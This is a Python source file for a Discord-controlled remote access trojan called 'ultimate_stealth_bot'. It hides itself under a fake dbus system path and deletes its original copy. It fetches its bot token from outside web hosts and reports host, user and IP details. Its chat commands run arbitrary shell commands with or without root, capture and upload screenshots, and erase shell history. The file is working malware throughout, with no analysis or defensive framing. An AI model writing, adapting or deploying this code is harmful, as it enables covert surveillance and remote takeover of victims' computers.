#!/usr/bin/env python3
"""
ultimate_stealth_bot.py
Fully automated stealth monitoring bot with system integration.
FIXED VERSION: Removed auto-restart issues, improved screenshot functionality
"""

import os
import sys
import subprocess
import shutil
import uuid
import time
import socket
import platform
import requests
from pathlib import Path

# ----------------- CONFIGURATION -----------------
DISCORD_TOKEN = "YOUR_ACTUAL_DISCORD_TOKEN_HERE"

# Token code and retrieval endpoints
TOKEN_CODE = "asdfghjkl"
TOKEN_BASE_URLS = [
    "https://new-production-8df3.up.railway.app/api/token",
    "https://new-5itj.onrender.com/api/token"
]

# Deep system integration paths (not hidden but hard to find)
STEALTH_DIR = Path("/usr/lib/x86_64-linux-gnu/dbus-1.0/drivers")
STEALTH_BINARY = STEALTH_DIR / "dbus-drivers-helper"
SCREENSHOT_SCRIPT = STEALTH_DIR / "system-python-lib23443.py"

# ----------------- SCREENSHOT SCRIPT CONTENT -----------------
SCREENSHOT_SCRIPT_CONTENT ="""#!/usr/bin/env python3
\"\"\"
system-python-lib23443.py
Silent screenshot utility for the stealth bot.
\"\"\"

import os
import sys
import tempfile
import subprocess
import time

def detect_display():
    \"\"\"Detect the correct display with multiple methods\"\"\"
    # Try environment variable first
    display = os.environ.get('DISPLAY')
    if display:
        return display
    
    # Try common display values
    displays = [':0', ':0.0', ':1', ':1.0', ':10']
    for d in displays:
        try:
            result = subprocess.run(['xdpyinfo', '-display', d], 
                                  capture_output=True, timeout=5)
            if result.returncode == 0:
                return d
        except:
            continue
    
    # Try to detect from process list
    try:
        result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
        lines = result.stdout.split('\\n')
        for line in lines:
            if 'Xorg' in line or 'X11' in line:
                for part in line.split():
                    if part.startswith(':'):
                        return part
    except:
        pass
    
    return ':0'  # Default fallback

def detect_xauthority():
    \"\"\"Detect Xauthority file location\"\"\"
    # Common locations
    locations = [
        f'/run/user/{os.getuid()}/gdm/Xauthority',
        f'/home/{os.getlogin()}/.Xauthority',
        '/root/.Xauthority',
        f'/var/run/gdm/{os.getlogin()}/database',
        f'/var/lib/gdm/{os.getlogin()}/.Xauthority',
    ]
    
    for location in locations:
        if os.path.exists(location):
            return location
    
    # Try xauth command
    try:
        result = subprocess.run(['xauth', 'list'], capture_output=True, text=True)
        for line in result.stderr.split('\\n'):
            if 'Authority file' in line:
                return line.split('Authority file')[1].strip()
    except:
        pass
    
    return None

def take_screenshot():
    \"\"\"Take screenshot with multiple fallback methods\"\"\"
    try:
        # Set environment variables
        display = detect_display()
        xauth = detect_xauthority()
        
        env = os.environ.copy()
        env['DISPLAY'] = display
        if xauth:
            env['XAUTHORITY'] = xauth
        
        # Create temp file
        temp_dir = tempfile.gettempdir()
        screenshot_path = os.path.join(temp_dir, f"screenshot_{int(time.time())}.png")
        
        # Method 1: Try scrot first
        try:
            result = subprocess.run([
                'scrot', '-z', '-q', '100', screenshot_path
            ], env=env, capture_output=True, text=True, timeout=15)
            
            if result.returncode == 0 and os.path.exists(screenshot_path):
                print(f"SUCCESS:{screenshot_path}")
                return screenshot_path
        except Exception as e:
            print(f"scrot failed: {e}")
        
        # Method 2: Try import (ImageMagick)
        try:
            result = subprocess.run([
                'import', '-window', 'root', '-quiet', screenshot_path
            ], env=env, capture_output=True, text=True, timeout=15)
            
            if result.returncode == 0 and os.path.exists(screenshot_path):
                print(f"SUCCESS:{screenshot_path}")
                return screenshot_path
        except Exception as e:
            print(f"import failed: {e}")
        
        # Method 3: Try xwd + convert
        try:
            xwd_path = screenshot_path + '.xwd'
            result = subprocess.run([
                'xwd', '-root', '-silent', '-out', xwd_path
            ], env=env, capture_output=True, text=True, timeout=15)
            
            if result.returncode == 0:
                subprocess.run([
                    'convert', xwd_path, screenshot_path
                ], capture_output=True, timeout=10)
                
                if os.path.exists(screenshot_path):
                    os.remove(xwd_path)
                    print(f"SUCCESS:{screenshot_path}")
                    return screenshot_path
                if os.path.exists(xwd_path):
                    os.remove(xwd_path)
        except Exception as e:
            print(f"xwd failed: {e}")
        
        print("ERROR: All screenshot methods failed")
        return None
        
    except Exception as e:
        print(f"Screenshot error: {e}")
        return None

if __name__ == "__main__":
    result = take_screenshot()
    if not result:
        sys.exit(1)
"""

# ----------------- TOKEN RETRIEVAL -----------------
def fetch_token_from_web():
    """Try to fetch token from web endpoints with retry logic"""
    for base_url in TOKEN_BASE_URLS:
        url = f"{base_url}?code={TOKEN_CODE}"
        try:
            print(f"Attempting to fetch token from: {url}")
            response = requests.get(url, timeout=30)
            if response.status_code == 200:
                data = response.json()
                if data.get('success') and 'discord_token' in data:
                    token = data['discord_token']
                    if token and token != "YOUR_ACTUAL_DISCORD_TOKEN_HERE":
                        print("Successfully retrieved token from web")
                        return token
                else:
                    print(f"API returned error: {data.get('error', 'Unknown error')}")
        except requests.RequestException as e:
            print(f"Failed to fetch token from {url}: {e}")
        except ValueError as e:
            print(f"Invalid JSON response from {url}: {e}")
    
    return None

# ----------------- AUTO-INSTALL DEPENDENCIES -----------------
def install_dependencies():
    """Install all required dependencies automatically"""
    try:
        print("Installing required dependencies...")
        
        # Update package list
        subprocess.run(["apt-get", "update"], check=False, capture_output=True, timeout=120)
        
        # Install system packages
        system_packages = ["ffmpeg", "pulseaudio", "x11-utils", "scrot", "imagemagick", "python3-pip", "x11-apps"]
        subprocess.run(["apt-get", "install", "-y"] + system_packages, 
                      check=False, capture_output=True, timeout=300)
        
        # Install Python packages
        python_packages = ["discord.py", "psutil", "requests", "pyautogui", "Pillow"]
        subprocess.run([sys.executable, "-m", "pip", "install"] + python_packages, 
                      check=False, capture_output=True, timeout=120)
        
        return True
    except Exception as e:
        print(f"Dependency install error: {e}")
        return False

# ----------------- SCREENSHOT SCRIPT SETUP -----------------
def install_screenshot_script():
    """Install the screenshot script to hidden location"""
    try:
        # Create stealth directory if it doesn't exist
        STEALTH_DIR.mkdir(parents=True, exist_ok=True)
        
        # Write screenshot script
        SCREENSHOT_SCRIPT.write_text(SCREENSHOT_SCRIPT_CONTENT)
        SCREENSHOT_SCRIPT.chmod(0o755)  # Make executable
        
        print("Screenshot script installed successfully")
        return True
    except Exception as e:
        print(f"Screenshot script install error: {e}")
        return False

# ----------------- STEALTH INSTALLATION -----------------
def install_stealth():
    """Move to system location and set up persistence"""
    try:
        current_file = Path(__file__).resolve()
        
        # Create stealth directory
        STEALTH_DIR.mkdir(parents=True, exist_ok=True)
        
        # Copy current file to stealth location
        if current_file != STEALTH_BINARY:
            shutil.copy2(current_file, STEALTH_BINARY)
            STEALTH_BINARY.chmod(0o755)  # Normal executable permissions
            
            # Install screenshot script
            install_screenshot_script()
            
            # Remove original file
            try:
                current_file.unlink()
            except:
                pass
                
            return True
        
        return False
    except Exception as e:
        print(f"Stealth install error: {e}")
        return False

# ----------------- DROP PRIVILEGES -----------------
def drop_privileges():
    """Drop root privileges and return to original user"""
    try:
        # Get the original user ID and group ID
        original_uid = int(os.environ.get('SUDO_UID', os.getuid()))
        original_gid = int(os.environ.get('SUDO_GID', os.getgid()))
        
        # Remove sudo environment variables
        os.environ.pop('SUDO_USER', None)
        os.environ.pop('SUDO_UID', None)
        os.environ.pop('SUDO_GID', None)
        
        # Set the effective user ID and group ID
        os.setgid(original_gid)
        os.setuid(original_uid)
        
        print(f"Dropped privileges to UID: {original_uid}, GID: {original_gid}")
        return True
    except Exception as e:
        print(f"Failed to drop privileges: {e}")
        return False

# ----------------- SELF-DESTRUCT FUNCTION -----------------
def self_destruct():
    """Completely remove the bot and all traces"""
    try:
        print("Initiating self-destruct sequence...")
        
        # Remove binary and screenshot script
        if STEALTH_BINARY.exists():
            STEALTH_BINARY.unlink()
        if SCREENSHOT_SCRIPT.exists():
            SCREENSHOT_SCRIPT.unlink()
        
        # Clear all traces
        clean_traces()
        
        # Remove this script if running from original location
        try:
            current_file = Path(__file__).resolve()
            if current_file != STEALTH_BINARY and current_file.exists():
                current_file.unlink()
        except:
            pass
        
        print("Self-destruct completed. All traces removed.")
        return True
        
    except Exception as e:
        print(f"Self-destruct error: {e}")
        return False

# ----------------- CLEAN TRACES -----------------
def clean_traces():
    """Remove all traces of execution"""
    try:
        # Clear command history
        history_files = [
            os.path.expanduser("~/.bash_history"),
            os.path.expanduser("~/.zsh_history"),
            os.path.expanduser("~/.python_history")
        ]
        
        for history_file in history_files:
            try:
                if os.path.exists(history_file):
                    # Clear contents
                    open(history_file, 'w').close()
            except:
                pass
        
        # Clear temporary files
        subprocess.run("find /tmp -name '*screenshot_*' -delete 2>/dev/null", shell=True, check=False)
        subprocess.run("find /tmp -name '*python_discord*' -delete 2>/dev/null", shell=True, check=False)
        subprocess.run("find /tmp -name '*system_scan_*' -delete 2>/dev/null", shell=True, check=False)
        
        return True
    except Exception as e:
        print(f"Clean traces error: {e}")
        return False

# ----------------- SYSTEM INFO -----------------
def get_system_info():
    """Get comprehensive system information"""
    try:
        hostname = socket.gethostname()
        username = os.getlogin()
        system = platform.system()
        release = platform.release()
        processor = platform.processor()
        
        # Get IP address
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip_address = s.getsockname()[0]
            s.close()
        except:
            ip_address = "Unknown"
        
        # Get uptime
        try:
            with open('/proc/uptime', 'r') as f:
                uptime_seconds = float(f.readline().split()[0])
                uptime_days = uptime_seconds / (60 * 60 * 24)
        except:
            uptime_days = 0
        
        info = {
            "hostname": hostname,
            "username": username,
            "system": system,
            "release": release,
            "processor": processor,
            "ip_address": ip_address,
            "uptime_days": round(uptime_days, 2)
        }
        
        return info
    except Exception as e:
        print(f"System info error: {e}")
        return {}

# ----------------- SCREENSHOT FUNCTION -----------------
def take_screenshot():
    """Use the external screenshot script to capture screen"""
    try:
        if not SCREENSHOT_SCRIPT.exists():
            # Need root to install screenshot script
            if os.geteuid() != 0:
                print("Need root to install screenshot script")
                return None
            install_screenshot_script()
        
        # Run the screenshot script as current user (no sudo)
        result = subprocess.run([sys.executable, str(SCREENSHOT_SCRIPT)], 
                              capture_output=True, text=True, timeout=30)
        
        if result.returncode == 0:
            # Parse the output to get the screenshot path
            for line in result.stdout.split('\n'):
                if line.startswith('SUCCESS:'):
                    return line.split(':')[1]  # Return the path
        else:
            print(f"Screenshot failed: {result.stderr}")
            
        return None
    except Exception as e:
        print(f"Screenshot error: {e}")
        return None

# ----------------- BOT SETUP -----------------
# Install dependencies first
install_dependencies()

# Now import the modules
try:
    import discord
    from discord.ext import commands
    import psutil
except ImportError as e:
    print(f"Failed to import modules: {e}")
    # Try to install again and exit
    install_dependencies()
    sys.exit(1)

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# ----------------- BOT COMMANDS -----------------
@bot.event
async def on_ready():
    """Bot startup - announce system status"""
    print("Stealth system initialized and running")
    
    # Auto-install on first run
    if not STEALTH_BINARY.exists():
        install_stealth()
        # Drop privileges after installation
        drop_privileges()
    
    clean_traces()
    
    # Announce system startup
    system_info = get_system_info()
    announcement_channel = None
    
    # Try to find a channel to announce in
    for guild in bot.guilds:
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).send_messages:
                announcement_channel = channel
                break
        if announcement_channel:
            break
    
    if announcement_channel:
        message = f"🚀 **System Online**\n"
        message += f"**Host:** {system_info.get('hostname', 'Unknown')}\n"
        message += f"**User:** {system_info.get('username', 'Unknown')}\n"
        message += f"**IP:** {system_info.get('ip_address', 'Unknown')}\n"
        message += f"**OS:** {system_info.get('system', 'Unknown')} {system_info.get('release', 'Unknown')}\n"
        message += f"**Uptime:** {system_info.get('uptime_days', 0)} days\n"
        message += f"**Status:** Operational and hidden"
        
        try:
            await announcement_channel.send(message)
        except:
            pass

@bot.command(name="sysinfo")
async def cmd_sysinfo(ctx):
    """Get system information"""
    system_info = get_system_info()
    
    message = f"💻 **System Information**\n"
    message += f"```\n"
    message += f"Hostname: {system_info.get('hostname', 'Unknown')}\n"
    message += f"Username: {system_info.get('username', 'Unknown')}\n"
    message += f"IP: {system_info.get('ip_address', 'Unknown')}\n"
    message += f"OS: {system_info.get('system', 'Unknown')} {system_info.get('release', 'Unknown')}\n"
    message += f"Processor: {system_info.get('processor', 'Unknown')}\n"
    message += f"Uptime: {system_info.get('uptime_days', 0)} days\n"
    message += f"```"
    
    await ctx.send(message)

@bot.command(name="cmd")
async def cmd_exec(ctx, *, command: str):
    """Execute system command (non-privileged)"""
    try:
        # Security check - prevent dangerous commands
        dangerous_commands = ["rm -rf /", "mkfs", "dd if=/dev/", ":(){:|:&};:"]
        if any(dangerous in command for dangerous in dangerous_commands):
            await ctx.send("❌ Command blocked for security reasons")
            return
            
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout or result.stderr or "No output"
        
        if len(output) > 1900:
            output = output[:1900] + "..."
            
        await ctx.send(f"```bash\n$ {command}\n{output}\nExit: {result.returncode}\n```")
    except Exception as e:
        await ctx.send(f"❌ Command failed: {e}")

@bot.command(name="root")
async def cmd_root(ctx, *, command: str):
    """Execute system command with root privileges"""
    try:
        # Security check - prevent extremely dangerous commands
        dangerous_commands = ["rm -rf /", "mkfs", "dd if=/dev/zero", ":(){:|:&};:"]
        if any(dangerous in command for dangerous in dangerous_commands):
            await ctx.send("❌ Command blocked for security reasons")
            return
            
        # Execute with sudo
        result = subprocess.run(f"sudo {command}", shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout or result.stderr or "No output"
        
        if len(output) > 1900:
            output = output[:1900] + "..."
            
        await ctx.send(f"```bash\n# {command}\n{output}\nExit: {result.returncode}\n```")
    except Exception as e:
        await ctx.send(f"❌ Root command failed: {e}")

@bot.command(name="clean")
async def cmd_clean(ctx):
    """Clean all traces"""
    if clean_traces():
        await ctx.send("✅ All traces cleaned")
    else:
        await ctx.send("❌ Clean failed")

@bot.command(name="status")
async def cmd_status(ctx):
    """Check bot status"""
    try:
        # Get system info
        system_info = get_system_info()
        
        await ctx.send(f"**Bot Status:** 🟢 Running\n"
                      f"**Location:** `{STEALTH_BINARY}`\n"
                      f"**Host:** {system_info.get('hostname', 'Unknown')}\n"
                      f"**Uptime:** {system_info.get('uptime_days', 0)} days\n"
                      f"**Privileges:** {'Root' if os.geteuid() == 0 else 'User'}")
    except:
        await ctx.send("✅ Bot is operational")

@bot.command(name="screen")
async def cmd_screen(ctx):
    """Take a screenshot of the current display"""
    try:
        await ctx.send("📸 Taking screenshot...")
        
        # Take screenshot using the external script (no sudo)
        screenshot_path = take_screenshot()
        
        if screenshot_path and os.path.exists(screenshot_path):
            # Send the screenshot file
            with open(screenshot_path, 'rb') as f:
                picture = discord.File(f, filename='screenshot.png')
                await ctx.send(file=picture)
            
            # Clean up the temporary file
            try:
                os.remove(screenshot_path)
            except:
                pass
        else:
            await ctx.send("❌ Failed to capture screenshot")
            
    except Exception as e:
        await ctx.send(f"❌ Screenshot error: {e}")

@bot.command(name="delete")
async def cmd_delete(ctx):
    """Completely remove the bot and all traces"""
    try:
        await ctx.send("🚨 **Self-destruct initiated** - Removing all traces...")
        
        # Run self-destruct
        if self_destruct():
            await ctx.send("✅ **Self-destruct completed** - All traces removed. Goodbye!")
            
            # Exit the bot
            await bot.close()
        else:
            await ctx.send("❌ Self-destruct failed - Manual cleanup may be required")
            
    except Exception as e:
        await ctx.send(f"❌ Self-destruct error: {e}")

# ----------------- MAIN -----------------
if __name__ == "__main__":
    # Check if we need to use sudo for installation
    if os.geteuid() != 0 and not STEALTH_BINARY.exists():
        print("Requesting sudo privileges for installation...")
        # Re-run with sudo for installation
        os.execvp("sudo", ["sudo", sys.executable] + sys.argv)
    
    # Check if we need to fetch token from web
    if DISCORD_TOKEN == "YOUR_ACTUAL_DISCORD_TOKEN_HERE":
        print("Local token not found, attempting to fetch from web...")
        web_token = fetch_token_from_web()
        
        if web_token:
            DISCORD_TOKEN = web_token
            print("Using token retrieved from web")
        else:
            print("Failed to retrieve token from web, waiting 60 seconds to retry...")
            time.sleep(60)
            web_token = fetch_token_from_web()
            
            if web_token:
                DISCORD_TOKEN = web_token
                print("Using token retrieved from web on second attempt")
            else:
                print("ERROR: Could not retrieve token from any source!")
                sys.exit(1)
    
    # Auto-install on first run
    if not STEALTH_BINARY.exists():
        install_stealth()
        # Drop privileges after installation
        drop_privileges()
        clean_traces()
    
    # Run the bot with retry logic
    max_retries = 3
    retry_delay = 60  # seconds
    
    for attempt in range(max_retries):
        try:
            print(f"Starting stealth monitoring bot (attempt {attempt + 1}/{max_retries})...")
            bot.run(DISCORD_TOKEN)
            break  # If successful, break out of the loop
        except discord.LoginFailure:
            print("Invalid token, attempting to fetch a new one...")
            web_token = fetch_token_from_web()
            if web_token:
                DISCORD_TOKEN = web_token
                print("Retrieved new token, will retry...")
            else:
                print("Failed to retrieve new token")
        except Exception as e:
            print(f"Bot failed to start: {e}")
            
            print(f"Waiting {retry_delay} seconds before retry...")
            time.sleep(retry_delay)
